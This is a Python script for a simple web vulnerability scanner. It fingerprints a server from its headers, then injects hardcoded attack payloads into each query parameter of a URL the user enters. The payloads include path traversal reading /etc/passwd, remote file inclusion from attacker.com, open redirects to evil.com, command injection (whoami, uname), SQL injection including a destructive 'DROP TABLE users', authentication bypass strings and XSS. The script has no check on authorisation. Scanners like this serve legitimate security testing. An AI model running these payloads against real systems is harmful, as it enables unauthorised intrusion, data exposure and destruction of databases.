#!/usr/bin/env python3
import re
import urllib.request
import urllib.parse
import time
from urllib.error import HTTPError, URLError

# Colors for Output
class Colors:
    def __init__(self):
        self.green = "\033[92m"
        self.blue = "\033[94m"
        self.bold = "\033[1m"
        self.yellow = "\033[93m"
        self.red = "\033[91m"
        self.end = "\033[0m"

ga = Colors()

# Utility to Print Styled Messages
def print_message(message, color):
    print(f"{color}{message}{ga.end}")

# HTTP Headers Handling
class HTTPHeader:
    HOST = "Host"
    SERVER = "Server"

# Function to Read and Display HTTP Headers
def headers_reader(url):
    print_message("\n[!] Fingerprinting the backend Technologies.", ga.bold)
    try:
        response = urllib.request.urlopen(url)
        if response.status == 200:
            print_message("[!] Status code: 200 OK", ga.green)
        elif response.status == 404:
            print_message("[!] Page not found! Check the URL.", ga.red)
            return

        server = response.headers.get(HTTPHeader.SERVER, "Unknown")
        host = urllib.parse.urlparse(url).netloc

        print_message(f"[!] Host: {host}", ga.green)
        print_message(f"[!] WebServer: {server}", ga.green)

        for key, value in response.headers.items():
            if "x-powered-by" in key.lower():
                print_message(f"[!] {key}: {value}", ga.green)

    except HTTPError as e:
        print_message(f"[!] HTTP Error: {e.code} - {e.reason}", ga.red)
    except URLError as e:
        print_message(f"[!] URL Error: {e.reason}", ga.red)
    except Exception as e:
        print_message(f"[!] Error: {str(e)}", ga.red)

# Main Function to Test Payloads
def test_payloads(url, payloads, regex_pattern, vuln_type):
    print_message(f"\n[!] Scanning for {vuln_type} Vulnerabilities", ga.bold)
    vulnerabilities = 0
    for params in url.split("?")[1].split("&"):
        for payload in payloads:
            modified_url = url.replace(params, params + str(payload).strip())
            try:
                response = urllib.request.urlopen(modified_url)
                html = response.read().decode("utf-8")
                if re.search(regex_pattern, html):
                    vulnerabilities += 1
                    print_message("\n[*] Vulnerability Found!", ga.red)
                    print_message(f"[*] Payload: {payload}", ga.red)
                    print_message(f"[!] Exploitation URL: {modified_url}", ga.blue)
            except HTTPError as e:
                print_message(f"[!] HTTP Error while testing payload {payload}: {e.code}", ga.yellow)
            except Exception as e:
                print_message(f"[!] Error testing payload {payload}: {str(e)}", ga.yellow)

    if vulnerabilities == 0:
        print_message(f"[!] No {vuln_type} vulnerabilities found!", ga.green)
    else:
        print_message(f"[!] Found {vulnerabilities} {vuln_type} vulnerabilities!", ga.blue)

# Vulnerability Functions

def detect_lfi(url):
    print_message("\n[!] Scanning for Local File Inclusion (LFI)", ga.bold)
    payloads = ["../../../../../../../../etc/passwd", "../../windows/win.ini", "/etc/passwd"]
    regex_pattern = re.compile("root:|\\[extensions\\]|\\[fonts\\]", re.I)
    test_payloads(url, payloads, regex_pattern, "Local File Inclusion")

def detect_rfi(url):
    print_message("\n[!] Scanning for Remote File Inclusion (RFI)", ga.bold)
    payloads = ["http://example.com/shell.txt", "http://attacker.com/malicious.php"]
    regex_pattern = re.compile("<\\?php|malicious|shell", re.I)
    test_payloads(url, payloads, regex_pattern, "Remote File Inclusion")

def detect_open_redirect(url):
    print_message("\n[!] Scanning for Open Redirect", ga.bold)
    payloads = ["http://evil.com", "//evil.com", "/\\evil.com"]
    regex_pattern = re.compile("evil\\.com", re.I)
    test_payloads(url, payloads, regex_pattern, "Open Redirect")

def detect_directory_traversal(url):
    print_message("\n[!] Scanning for Directory Traversal", ga.bold)
    payloads = ["../../../../etc/passwd", "../../../../boot.ini", "../" * 10 + "etc/passwd"]
    regex_pattern = re.compile("root:|\\[boot\\]", re.I)
    test_payloads(url, payloads, regex_pattern, "Directory Traversal")

def detect_command_injection(url):
    print_message("\n[!] Scanning for Command Injection", ga.bold)
    payloads = ["; uname -a", "&& dir", "| whoami"]
    regex_pattern = re.compile("Linux|Windows|root|Administrator", re.I)
    test_payloads(url, payloads, regex_pattern, "Command Injection")

def detect_auth_bypass(url):
    print_message("\n[!] Scanning for Authentication Bypass", ga.bold)
    payloads = ["' OR '1'='1", "' OR 'x'='x", "\" OR \"a\"=\"a"]
    regex_pattern = re.compile("Welcome|Dashboard|Logged in", re.I)
    test_payloads(url, payloads, regex_pattern, "Authentication Bypass")

def detect_xss(url):
    print_message("\n[!] Scanning for Cross-Site Scripting (XSS)", ga.bold)
    payloads = ["<script>alert('XSS')</script>", "><img src=x onerror=alert(1)>"]
    regex_pattern = re.compile("<script>alert|alert\\(1\\)", re.I)
    test_payloads(url, payloads, regex_pattern, "XSS")

def detect_sql_injection(url):
    print_message("\n[!] Scanning for SQL Injection", ga.bold)
    payloads = ["1' OR '1'='1", "' UNION SELECT 1,2,3 --", "'; DROP TABLE users --"]
    regex_pattern = re.compile("SQL syntax|mysql_fetch", re.I)
    test_payloads(url, payloads, regex_pattern, "SQL Injection")

# Entry Point
if __name__ == "__main__":
    print_message("\n[+] Starting Comprehensive Vulnerability Scanner...", ga.bold)
    target_url = input(ga.green + "[!] Enter the URL to scan (e.g., http://example.com/page?id=1): " + ga.end)
    if "?" not in target_url:
        print_message("[!] Invalid URL. Ensure the URL includes parameters (e.g., ?id=value).", ga.red)
        exit()

    headers_reader(target_url)
    detect_lfi(target_url)
    detect_rfi(target_url)
    detect_open_redirect(target_url)
    detect_directory_traversal(target_url)
    detect_command_injection(target_url)
    detect_auth_bypass(target_url)
    detect_xss(target_url)
    detect_sql_injection(target_url)
